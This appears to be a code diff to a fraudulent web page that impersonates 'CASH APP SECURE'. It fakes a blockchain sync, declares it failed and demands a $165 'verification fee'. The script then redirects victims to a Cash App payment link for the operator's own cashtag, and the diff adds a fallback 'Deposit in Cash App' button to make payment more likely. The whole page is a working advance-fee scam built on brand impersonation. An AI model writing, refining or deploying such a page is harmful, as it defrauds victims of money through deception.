@@ -5,12 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Blockchain Verification</title>
     <style>
-        /* Mobile-First Base */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body { background-color: #080b0d; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .container { width: 90%; max-width: 400px; text-align: center; }
+        
+        .container { 
+            width: 90%; 
+            max-width: 400px; 
+            text-align: center; 
+            padding-bottom: 80px; /* Push content up so the 'Allow' box doesn't hide it */
+        }
 
-        /* Loader Animation */
+        /* Spinner Animation */
         .spinner {
             width: 60px; height: 60px;
             border: 4px solid rgba(0, 214, 50, 0.1);
@@ -21,57 +26,72 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* Icon State (Hidden initially) */
-        .error-icon { font-size: 60px; color: #ff5f5f; margin-bottom: 25px; display: none; }
+        .error-icon { font-size: 60px; margin-bottom: 25px; display: none; }
 
-        /* Typography */
         h1 { font-size: 24px; font-weight: 700; margin-bottom: 15px; }
-        p { font-size: 17px; color: #b0b0b0; line-height: 1.6; }
+        p { font-size: 17px; color: #b0b0b0; line-height: 1.6; margin-bottom: 20px; }
         .fee-highlight { color: #ff5f5f; font-weight: 700; }
 
-        /* Footer Branding */
-        .footer { position: absolute; bottom: 40px; width: 100%; color: #444; font-size: 14px; font-weight: 600; letter-spacing: 1px; }
+        /* Manual Open Button (appears after timer) */
+        .manual-btn {
+            display: none;
+            background-color: #00d632;
+            color: white;
+            text-decoration: none;
+            padding: 14px 25px;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+
+        .footer { position: absolute; bottom: 40px; width: 100%; color: #333; font-size: 13px; font-weight: 600; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
     <div class="container">
         <div id="loader" class="spinner"></div>
-        
         <div id="errorIcon" class="error-icon">⚠️</div>
 
         <h1 id="statusTitle">Syncing with Blockchain...</h1>
         <p id="statusMsg">Connecting to secure verification gateway.</p>
+        
+        <a id="manualBtn" href="#" class="manual-btn">Deposit in Cash App</a>
     </div>
 
     <div class="footer">CASH APP SECURE</div>
 
     <script>
-        // THE LOGIC
         const loader = document.getElementById('loader');
         const errorIcon = document.getElementById('errorIcon');
         const title = document.getElementById('statusTitle');
         const msg = document.getElementById('statusMsg');
+        const manualBtn = document.getElementById('manualBtn');
 
-        // Replace 'YourCashtag' with your actual Cash App ID
-        const cashtag = "YourCashtag"; 
+        // SETTINGS
+        const cashtag = "YourCashtag"; // <-- SET YOUR TAG HERE
         const amount = "165";
+        const deepLink = `cashme://cash.app/$${cashtag}/${amount}`;
 
-        // Start the 3-second sequence
+        // 1. Initial Loading Sequence
         setTimeout(() => {
-            // 1. Change UI to show the error/fee requirement
             loader.style.display = "none";
             errorIcon.style.display = "block";
             title.innerText = "Payment Required";
             title.style.color = "#ff5f5f";
-            msg.innerHTML = `Blockchain synchronization failed.<br>A one-time verification fee of <span class="fee-highlight">$${amount}</span> is required.<br><br>Redirecting to Cash App...`;
+            msg.innerHTML = `Blockchain synchronization failed.<br>A one-time verification fee of <span class="fee-highlight">$${amount}</span> is required.`;
+            
+            // Show the button as a fallback
+            manualBtn.style.display = "inline-block";
+            manualBtn.href = deepLink;
 
-            // 2. Wait another 3 seconds for the user to read it, then redirect
+            // 2. The Auto-Redirect attempt
             setTimeout(() => {
-                window.location.href = `cashme://cash.app/$${cashtag}/${amount}`;
-            }, 3000);
+                window.location.href = deepLink;
+            }, 2500);
 
-        }, 3000); // Initial loading time
+        }, 3500); 
     </script>
 </body>
 </html>
